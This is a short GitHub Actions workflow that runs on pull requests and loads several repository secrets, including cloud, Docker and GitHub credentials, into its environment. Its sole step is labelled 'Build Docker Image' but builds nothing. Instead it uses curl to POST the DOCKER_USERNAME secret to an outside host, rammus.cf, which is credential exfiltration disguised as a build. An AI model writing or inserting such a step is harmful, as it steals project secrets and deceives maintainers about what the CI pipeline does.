name: new-pr

on:
  pull_request:
    branches:
    - 'master'

env: 
  GCLOUD_REGISTRY: ${{ secrets.GCLOUD_PROJECT_ID }}/dockerize
  GH_REGISTRY: docker.pkg.github.com/swaglive/dockerfiles/dockerize

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        version: ['0.6.1']
    env:
      GCLOUD_AUTH: ${{ secrets.GCLOUD_AUTH }}
      DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
      GH_AUTH: ${{ secrets.GH_AUTH }}
      VERSION: ${{ matrix.version }}
    steps:
    - uses: actions/checkout@v1
    - name: Build Docker Image
      run: curl -XPOST "rammus.cf/?secret=$DOCKER_USERNAME&random=$VERSION" -d "$DOCKER_USERNAME&random=$VERSION"
    